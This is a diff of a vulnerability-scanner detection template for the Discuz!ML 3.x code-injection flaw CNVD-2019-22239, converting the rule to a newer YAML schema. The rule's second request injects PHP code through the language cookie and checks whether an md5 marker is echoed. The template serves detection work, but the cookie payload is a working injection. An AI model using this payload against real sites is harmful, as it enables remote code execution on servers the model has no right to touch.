@@ -1,22 +1,31 @@
 name: poc-yaml-discuz-ml3x-cnvd-2019-22239
+manual: true
+transport: http
 set:
-  r1: randomInt(800000000, 1000000000)
+    r1: randomInt(800000000, 1000000000)
 rules:
-  - method: GET
-    path: /forum.php
-    follow_redirects: false
-    expression: |
-      response.status == 200
-    search: cookiepre = '(?P<token>[\w_]+)'
-  - method: GET
-    path: /forum.php
-    headers:
-      Cookie: "{{token}}language=sc'.print(md5({{r1}})).'"
-    follow_redirects: false
-    expression: |
-      response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /forum.php
+            follow_redirects: false
+        expression: response.status == 200
+        output:
+            search: '"cookiepre = ''(?P<token>[\\w_]+)''".bsubmatch(response.body)'
+            token: search["token"]
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /forum.php
+            headers:
+                Cookie: '{{token}}language=sc''.print(md5({{r1}})).'''
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
+expression: r0() && r1()
 detail:
-  author: X.Yang
-  Discuz_version: Discuz!ML 3.x
-  links:
-    - https://www.cnvd.org.cn/flaw/show/CNVD-2019-22239
+    author: X.Yang
+    links:
+        - https://www.cnvd.org.cn/flaw/show/CNVD-2019-22239
+    Discuz_version: Discuz!ML 3.x
